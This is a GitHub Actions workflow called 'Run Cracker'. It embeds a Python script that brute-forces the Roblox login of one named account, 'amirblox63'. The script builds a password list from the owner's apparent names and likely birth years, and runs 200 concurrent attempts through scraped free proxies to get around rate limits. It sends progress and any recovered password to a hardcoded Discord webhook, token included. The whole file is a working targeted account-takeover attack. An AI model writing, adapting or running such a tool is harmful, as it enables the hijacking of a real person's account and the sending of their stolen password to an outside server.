name: Run Cracker
on:
  workflow_dispatch:
  schedule:
    - cron: '0 */4 * * *'

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'
          
      - name: Install dependencies
        run: pip install aiohttp
        
      - name: Run script
        run: |
          cat << 'EOF' > run.py
          import asyncio
          import aiohttp
          import random
          import re
          import itertools

          TARGET_USERNAME = "amirblox63"
          WEBHOOK_URL = "https://discord.com/api/webhooks/1546881790654947331/-sGYjqeK4Kg5wOPBS4V7qVU1pyvn1Glc-wgp0_F6_V9RtQdClcaknk7QdU2LAJD1wQgG"

          CONCURRENT_TASKS = 200 
          proxy_list = []

          # دالة توليد الاحتمالات بناءً على الاسم والنسب
          def generate_targeted_passwords():
              names = ["ali", "ajghoud", "amir", "ali.ajghoud", "aliajghoud", "amirblox"]
              numbers = ["1", "12", "123", "1234", "12345", "7", "77", "99", "2005", "2006", "2007", "2008", "2009", "2010", "2023", "2024"]
              symbols = ["", "!", "@", "_", "."]
              
              passwords = set()
              
              for name in names:
                  # الاسم لوحده
                  passwords.add(name)
                  passwords.add(name.capitalize())
                  passwords.add(name.upper())
                  
                  # الاسم مع الأرقام
                  for num in numbers:
                      passwords.add(name + num)
                      passwords.add(name.capitalize() + num)
                      passwords.add(num + name)
                  
                  # الاسم مع الرموز
                  for sym in symbols:
                      passwords.add(name + sym)
              
              # خلط الاسمين مع بعض
              base_names = ["ali", "ajghoud"]
              for n1, n2 in itertools.product(base_names, repeat=2):
                  for num in numbers:
                      passwords.add(n1 + n2 + num)
                      passwords.add(n1.capitalize() + n2.capitalize() + num)

              # إضافة كلمة pass
              for name in names:
                  passwords.add(name + "pass")
                  passwords.add(name + "123456")
              
              # تحويل الحروف لبعض الرموز (Leetspeak)
              leet_dict = {'a': '@', 'i': '1', 'o': '0', 'e': '3'}
              leet_passwords = set()
              for pwd in passwords:
                  leet_pwd = "".join(leet_dict.get(c, c) for c in pwd)
                  leet_passwords.add(leet_pwd)
                  
              final_passwords = list(passwords.union(leet_passwords))
              random.shuffle(final_passwords)
              return final_passwords

          async def send_to_discord(session, content):
              try:
                  data = {"content": content, "username": "GitHub Cracker"}
                  await session.post(WEBHOOK_URL, json=data, timeout=10)
              except:
                  pass

          async def get_free_proxies(session):
              url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
              try:
                  async with session.get(url, timeout=10) as response:
                      if response.status == 200:
                          text = await response.text()
                          lines = text.strip().split('\n')
                          return [line.strip() for line in lines if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', line.strip())]
              except:
                  return []

          async def check_account(session, password):
              proxy = random.choice(proxy_list) if proxy_list else None
              proxy_url = f"http://{proxy}" if proxy else None
              try:
                  async with session.post("https://auth.roblox.com/v2/login", json={"username": TARGET_USERNAME, "password": "dummy"}, proxy=proxy_url, timeout=4) as r1:
                      csrf = r1.headers.get("x-csrf-token")
                  if not csrf: return password, "PROXY_FAIL"
                  
                  headers = {"x-csrf-token": csrf}
                  async with session.post("https://auth.roblox.com/v2/login", json={"username": TARGET_USERNAME, "password": password}, headers=headers, proxy=proxy_url, timeout=4) as r2:
                      if r2.status == 200: return password, "SUCCESS"
                      elif r2.status == 403:
                          text = await r2.text()
                          if "captcha" in text.lower() or "challenge" in text.lower(): return password, "VERIFICATION"
                          return password, "FAILED"
                      return password, f"ERROR_{r2.status}"
              except:
                  return password, "TIMEOUT"

          async def worker(session, semaphore, stats, found_event, wordlist):
              while not found_event.is_set() and wordlist:
                  async with semaphore:
                      pwd = wordlist.pop()
                      _, status = await check_account(session, pwd)
                      stats['attempts'] += 1
                      if status == "SUCCESS":
                          found_event.set()
                          stats['found'] = pwd
                          break

          async def main():
              global proxy_list
              
              print("[*] جاري بناء قائمة الاحتمالات الذكية...")
              wordlist = generate_targeted_passwords()
              print(f"[*] تم توليد {len(wordlist)} باسورد متوقع بناءً على الاسم.")

              async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=CONCURRENT_TASKS, ssl=False)) as session:
                  proxy_list = await get_free_proxies(session)
                  await send_to_discord(session, f"🚀 **بدأ التخمين الذكي (بناءً على الاسم)!**\nالحساب: `{TARGET_USERNAME}`")

                  semaphore = asyncio.Semaphore(CONCURRENT_TASKS)
                  stats = {'attempts': 0, 'found': None}
                  found_event = asyncio.Event()
                  
                  tasks = [asyncio.create_task(worker(session, semaphore, stats, found_event, wordlist)) for _ in range(CONCURRENT_TASKS)]
                  
                  while not found_event.is_set() and wordlist:
                      await asyncio.sleep(5)
                      print(f"[{stats['attempts']}] محاولة...")

                  for task in tasks: task.cancel()
                  
                  if stats['found']:
                      print(f"\n✅✅✅ الباسورد هو: {stats['found']} ✅✅✅")
                      await send_to_discord(session, f"@everyone 🎉 **تم إيجاد الباسورد!**\nالحساب: `{TARGET_USERNAME}`\nالباسورد: `{stats['found']}`")
                  else:
                      print("\n[-] انتهت القائمة ولم يتم إيجاد الباسورد.")

          asyncio.run(main())
          EOF
          python run.py
